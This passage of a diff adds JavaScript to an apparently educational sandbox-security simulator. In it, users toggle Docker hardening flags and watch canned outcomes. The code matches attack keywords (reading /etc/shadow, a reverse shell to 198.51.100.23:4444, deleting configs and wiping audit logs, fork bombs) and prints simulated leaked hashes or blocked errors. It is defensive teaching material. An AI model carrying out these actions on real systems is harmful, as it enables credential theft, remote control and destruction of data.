+    updateTelemetry();
+  }
+
+  document.querySelectorAll('.langs .lg').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      applyLang(this.getAttribute('data-l'));
+    });
+  });
+
+  // Theme Switching
+  var themes = ['auto', 'light', 'dark'];
+  var currentTheme = 'auto';
+  var themeBtn = document.getElementById('themeBtn');
+  themeBtn.addEventListener('click', function(){
+    var idx = (themes.indexOf(currentTheme) + 1) % themes.length;
+    currentTheme = themes[idx];
+    if(currentTheme === 'auto'){
+      document.documentElement.removeAttribute('data-theme');
+      themeBtn.textContent = '◐ АВТО';
+    } else {
+      document.documentElement.setAttribute('data-theme', currentTheme);
+      themeBtn.textContent = currentTheme === 'light' ? '☀ СВЕТЛАЯ' : '☾ ТЁМНАЯ';
+    }
+  });
+
+  // Switch Items Click
+  document.querySelectorAll('.switch-item').forEach(function(item){
+    item.addEventListener('click', function(){
+      var sw = this.getAttribute('data-sw');
+      switches[sw] = !switches[sw];
+      this.classList.toggle('enabled', switches[sw]);
+      updateDefenseScore();
+      updateTelemetry();
+    });
+  });
+
+  function updateDefenseScore(){
+    var onCount = Object.values(switches).filter(Boolean).length;
+    var badge = document.getElementById('defenseScore');
+    badge.textContent = onCount + ' / 6 ON';
+    badge.className = 'badge ' + (onCount === 6 ? 'green' : (onCount >= 3 ? 'yellow' : 'red'));
+
+    var rtBadge = document.getElementById('runtimeBadge');
+    if(switches.gvisor){
+      rtBadge.textContent = 'Runtime: runsc (gVisor Microkernel)';
+      rtBadge.className = 'badge green';
+    } else if(onCount >= 4){
+      rtBadge.textContent = 'Runtime: Hardened Docker (Non-Root)';
+      rtBadge.className = 'badge green';
+    } else if(onCount > 0){
+      rtBadge.textContent = 'Runtime: Partially Sandboxed';
+      rtBadge.className = 'badge yellow';
+    } else {
+      rtBadge.textContent = 'Runtime: Bare-Metal (Root Host)';
+      rtBadge.className = 'badge red';
+    }
+  }
+
+  // Preset Clicks
+  var editor = document.getElementById('codeEditor');
+  document.querySelectorAll('.preset-btn').forEach(function(btn){
+    btn.addEventListener('click', function(){
+      document.querySelectorAll('.preset-btn').forEach(function(b){ b.classList.remove('active'); });
+      this.classList.add('active');
+      var p = this.getAttribute('data-p');
+      editor.value = PRESETS[p].code;
+    });
+  });
+
+  document.getElementById('resetCodeBtn').addEventListener('click', function(){
+    var activeP = document.querySelector('.preset-btn.active');
+    if(activeP){
+      editor.value = PRESETS[activeP.getAttribute('data-p')].code;
+    }
+  });
+
+  // Terminal Logging
+  var termBody = document.getElementById('termBody');
+  function addTermLine(cmd, output, type){
+    var line = document.createElement('div');
+    line.className = 'term-line';
+    line.innerHTML = '<span class="term-prompt">agent@sandbox:~$</span><span class="term-cmd">' + escapeHtml(cmd) + '</span>';
+    termBody.appendChild(line);
+
+    if(output){
+      var out = document.createElement('div');
+      out.className = 'term-out ' + (type || '');
+      out.textContent = output;
+      termBody.appendChild(out);
+    }
+    termBody.scrollTop = termBody.scrollHeight;
+  }
+
+  function escapeHtml(s){
+    return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  document.getElementById('clearTermBtn').addEventListener('click', function(){
+    termBody.innerHTML = '';
+  });
+
+  // Telemetry updates
+  function updateTelemetry(compromise, leak, status, blast){
+    var hostEl = document.getElementById('teleHost');
+    var leakEl = document.getElementById('teleLeak');
+    var statusEl = document.getElementById('teleStatus');
+    var blastEl = document.getElementById('teleBlast');
+
+    if(compromise !== undefined){
+      hostEl.textContent = compromise ? 'PWNED (0%)' : '100% OK';
+      hostEl.className = 'tele-val ' + (compromise ? 'danger' : 'safe');
+    }
+    if(leak !== undefined){
+      leakEl.textContent = leak ? '2.4 KB (LEAKED)' : '0 BYTES';
+      leakEl.className = 'tele-val ' + (leak ? 'danger' : 'safe');
+    }
+    if(status !== undefined){
+      statusEl.textContent = status;
+      statusEl.className = 'tele-val ' + (status === 'RUNNING' ? 'warn' : (status === 'DENIED' ? 'safe' : 'safe'));
+    }
+    if(blast !== undefined){
+      blastEl.textContent = blast;
+      blastEl.className = 'tele-val ' + (blast === 'ISOLATED' ? 'safe' : (blast === 'CONTAINER' ? 'warn' : 'danger'));
+    }
+  }
+
+  // Execution Simulator
+  document.getElementById('runBtn').addEventListener('click', function(){
+    var code = editor.value;
+    updateTelemetry(undefined, undefined, 'RUNNING');
+
+    // Simulate docker build & run command string
+    var dockerFlags = ['docker', 'run', '--rm', '-i'];
+    if(switches.user) dockerFlags.push('--user 10001:10001');
+    if(switches.readonly) dockerFlags.push('--read-only --tmpfs /tmp:rw,noexec');
+    if(switches.caps) dockerFlags.push('--cap-drop=ALL --security-opt=no-new-privileges:true');
+    if(switches.net) dockerFlags.push('--network none');
+    if(switches.limits) dockerFlags.push('--memory 128m --cpus 0.5 --pids-limit 20');
+    if(switches.gvisor) dockerFlags.push('--runtime=runsc');
+    dockerFlags.push('python:3.11-slim python3 -');
+
+    var cmdStr = dockerFlags.join(' ');
+    
+    setTimeout(function(){
+      // Check attacks in code
+      if(code.indexOf('/etc/shadow') !== -1){
+        if(!switches.user && !switches.caps && !switches.gvisor){
+          // Root Bare metal: Leaks
+          addTermLine(cmdStr, 
+            "[!] Attempting to open /etc/shadow directly...\n" +
+            "[PWNED] Leaked password hashes:\n" +
+            "    root:$6$vQ7Z9PqL$B9mKq7xY2e5R0pT1gN8sL3dF...:19730:0:99999:7:::\n" +
+            "    daemon:*:19730:0:99999:7:::\n" +
+            "    admin:$6$j4F1kL9m$Z3vX9sT1rN8pL2dK...:19730:0:99999:7:::", 'err');
+          updateTelemetry(true, true, 'EXPLOITED', 'MAX (HOST)');
+          markQuest('q1');
+        } else {
+          // Blocked by non-root or capabilities
+          addTermLine(cmdStr,
+            "[!] Attempting to open /etc/shadow directly...\n" +
+            "Traceback (most recent call last):\n" +
+            "  File \"<stdin>\", line 5, in <module>\n" +
+            "PermissionError: [Errno 13] Permission denied: '/etc/shadow'\n" +
+            "[AUDIT BLOCKED] Non-root UID 10001 restricted by DAC permissions.", 'ok');
+          updateTelemetry(false, false, 'DENIED', switches.gvisor ? 'ISOLATED' : 'CONTAINER');
+          markQuest('q2');
+        }
+      }
+      else if(code.indexOf('reverse shell') !== -1 || code.indexOf('socket.connect') !== -1){
+        if(!switches.net){
+          addTermLine(cmdStr,
+            "[!] Initiating TCP connection to 198.51.100.23:4444...\n" +
+            "[PWNED] Connection established! Spawning remote shell...\n" +
+            "[C2 BEACON] Attacker hijacked terminal session via PID 1042.", 'err');
+          updateTelemetry(true, true, 'EXPLOITED', 'HOST HIJACKED');
+        } else {
+          addTermLine(cmdStr,
+            "[!] Initiating TCP connection to 198.51.100.23:4444...\n" +
+            "Traceback (most recent call last):\n" +
+            "  File \"<stdin>\", line 8, in <module>\n" +
+            "OSError: [Errno 101] Network is unreachable\n" +
+            "[AUDIT BLOCKED] Container network namespace (--network none) dropped SYN packet.", 'ok');
+          updateTelemetry(false, false, 'DENIED', 'ISOLATED');
+          markQuest('q3');
+        }
+      }
+      else if(code.indexOf('nginx.conf') !== -1 || code.indexOf('audit.log') !== -1){
+        if(!switches.readonly){
+          addTermLine(cmdStr,
+            "[!] Attempting to delete /etc/nginx/nginx.conf...\n" +
+            "[!] Overwriting /var/log/audit.log with zeros...\n" +
+            "[PWNED] Filesystem compromised, system logs erased!", 'err');
+          updateTelemetry(true, false, 'COMPROMISED', 'FILESYSTEM');
+        } else {
+          addTermLine(cmdStr,
+            "[!] Attempting to delete /etc/nginx/nginx.conf...\n" +
+            "Traceback (most recent call last):\n" +
+            "  File \"<stdin>\", line 5, in <module>\n" +
+            "OSError: [Errno 30] Read-only file system: '/etc/nginx/nginx.conf'\n" +
+            "[AUDIT BLOCKED] Rootfs mounted as read-only. Write syscall rejected.", 'ok');
+          updateTelemetry(false, false, 'DENIED', 'CONTAINER');
+          markQuest('q2');
+        }
+      }
+      else if(code.indexOf('os.fork') !== -1){
+        if(!switches.limits){
+          addTermLine(cmdStr,
+            "[!] Initiating Fork Bomb... Spawning processes!\n" +
+            "Spawned generation 1\nSpawned generation 2...\n" +
+            "[CRITICAL KERNEL LOCK] Host CPU pinned at 100%. Thread pool exhausted!", 'err');
+          updateTelemetry(true, false, 'DoS CRASH', 'HOST CPU HUNG');
+        } else {
+          addTermLine(cmdStr,
+            "[!] Initiating Fork Bomb... Spawning processes!\n" +
+            "Spawned generation 1... 19\n" +
+            "BlockingIOError: [Errno 11] Resource temporarily unavailable (pids-limit reached: 20)\n" +
+            "[AUDIT BLOCKED] cgroups v2 pids.max exceeded. Kernel killed rogue child threads.", 'ok');
+          updateTelemetry(false, false, 'THROTTLED', 'ISOLATED');
+          if(Object.values(switches).every(Boolean)){
+            markQuest('q4');
+          }
+        }
+      }
+      else {
+        // Safe analytics
+        addTermLine(cmdStr,
+          "[OK] Processed 7 items successfully.\n" +
+          "[OK] Mean: 56.00, StdDev: 26.91\n" +
+          "[AUDIT PASSED] Memory used: 14.2 MB / 128 MB. Zero security violations.", 'ok');
+        updateTelemetry(false, false, 'COMPLETED', switches.gvisor ? 'ISOLATED' : 'CLEAN');
+      }
+    }, 450);
+  });
+
+  function markQuest(qid){
+    if(completedQuests[qid]) return;
+    completedQuests[qid] = true;
+    var item = document.getElementById(qid);
+    item.classList.add('done');
+    item.querySelector('.quest-status').innerHTML = '<span>✅ BAJARILDI (2.5)</span>';
+
+    var doneCount = Object.values(completedQuests).filter(Boolean).length;
+    var badge = document.getElementById('questScoreBadge');
+    badge.textContent = doneCount + ' / 4 Bajarildi (' + (doneCount * 2.5) + ' ball)';
+
+    if(doneCount === 4){
+      document.getElementById('certModal').classList.add('open');
+    }
+  }
+
+  document.getElementById('certBtn').addEventListener('click', function(){
+    document.getElementById('certModal').classList.add('open');
+  });
+  document.getElementById('closeCertBtn').addEventListener('click', function(){
+    document.getElementById('certModal').classList.remove('open');
+  });
+
+  // Initial
+  applyLang('ru');
+  updateDefenseScore();
+})();
+</script>
+</body>
+</html>
